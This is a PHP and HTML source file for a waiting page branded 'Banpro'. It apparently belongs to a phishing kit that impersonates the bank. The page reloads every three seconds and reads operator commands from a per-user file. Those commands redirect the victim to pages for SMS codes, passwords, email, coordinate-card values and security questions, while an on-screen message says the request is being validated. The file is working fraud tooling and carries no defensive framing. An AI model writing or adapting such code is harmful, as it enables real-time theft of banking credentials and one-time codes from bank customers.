<?php
session_start();
$usuario = $_SESSION['usuario'] ?? null;

if (!$usuario) {
  header("Location: index.php");
  exit;
}

$archivo = "acciones/$usuario.txt";

if (file_exists($archivo)) {
    $accion = trim(file_get_contents($archivo));
    unlink($archivo);

    if (str_starts_with($accion, "/palabra clave/")) {
        $partes = explode("/palabra clave/", $accion);
        if (count($partes) > 1) {
            $_SESSION['pregunta'] = trim($partes[1]);
            header("Location: pregunta.php");
            exit;
        }
    }

    if (str_starts_with($accion, "/coordenadas etiquetas/")) {
        $partes = explode("/coordenadas etiquetas/", $accion);
        if (count($partes) > 1) {
            $_SESSION['etiquetas'] = trim($partes[1]);
            header("Location: coordenadas.php");
            exit;
        }
    }

    $destinos_validos = ['sms.php', 'smserror.php', 'index2.php', 'correo.php', 'clave.php', 'coordenadas.php', 'pregunta.php'];
    if (in_array($accion, $destinos_validos)) {
        header("Location: $accion");
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Banpro</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="refresh" content="3">
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
      font-family: Arial, sans-serif;
      background-color: #fff;
      text-align: center;
      padding: 20px;
    }

    .titulo-verde {
      font-size: 1.4em;
      color: #2e7d32;
      margin-bottom: 10px;
    }

    .subtexto {
      font-size: 1.1em;
      color: #444;
      margin-bottom: 30px;
    }

    .contenedor-carga {
      width: 60px;
      height: 60px;
      margin-top: 10px;
    }

    .loader {
      width: 60px;
      height: 60px;
      border: 6px solid #e0e0e0;
      border-top: 6px solid #2e7d32;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 0 auto;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <p class="titulo-verde">Por favor, espera...</p>
  <p class="subtexto">Estamos validando tu solicitud, mantente en línea</p>

  <div class="contenedor-carga">
    <div class="loader"></div>
  </div>
</body>
</html>
